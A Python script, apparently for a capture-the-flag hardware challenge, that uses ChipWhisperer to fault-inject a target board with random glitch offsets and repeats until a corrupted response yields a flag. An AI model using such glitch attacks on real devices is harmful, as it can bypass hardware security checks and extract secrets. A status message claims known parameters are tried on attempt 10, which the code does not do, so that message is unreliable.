import chipwhisperer as cw
import time
import sys
import random

def reset_target():
    scope.io.nrst = "low" 
    time.sleep(0.05)
    scope.io.nrst = "high_z"
    time.sleep(0.05)

def reboot_flush():
    reset_target()
    target.flush()

scope = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)

scope.default_setup()

reset_target()

print("[*] Testing communication...", flush=True)
target.simpleserial_write("d", bytearray([]))
resp = target.simpleserial_read_witherrors('r', 26, timeout=1000)
if resp and isinstance(resp, dict):
    data = resp.get('payload')
    if data and b"DIAGNOSTIC_OK" in data:
        print("[+] Target responding correctly!\n", flush=True)

print("[*] Starting glitch attack...", flush=True)
print("[*] Will try known working parameters on attempt 10\n", flush=True)

for attempt in range(1, 2001):
    offset = random.randint(400, 1800)
    repeat = random.randint(3, 10)
    
    scope.glitch.ext_offset = offset
    scope.glitch.repeat = repeat
    
    scope.arm()
    target.simpleserial_write("d", bytearray([]))
    scope.capture()
    
    resp = target.simpleserial_read_witherrors('r', 26, timeout=40, glitch_timeout=40)
    
    if resp and isinstance(resp, dict):
        data = resp.get('payload')
        if data:
            text = data.decode('ascii', errors='ignore').strip()
            if "DIAGNOSTIC_OK" not in text and len(text) > 5:
                print("\n" + "★" * 60, flush=True)
                print("★ SUCCESS! FLAG CAPTURED!", flush=True)
                print("★" * 60, flush=True)
                print(f"Attempt: {attempt}", flush=True)
                print(f"Glitch parameters: offset={offset}, repeat={repeat}", flush=True)
                print(f"FLAG: {text}", flush=True)
                print("★" * 60, flush=True)
                break
    
    if attempt % 10 == 0:
        print(f"[*] Attempt {attempt}: offset={offset}, repeat={repeat}, response={resp['payload']}", flush=True)
    
    reset_target()

else:
    print("\n[!] No flag found after 2000 attempts", flush=True)

scope.dis()
target.dis()
print("\n[+] Done!", flush=True)
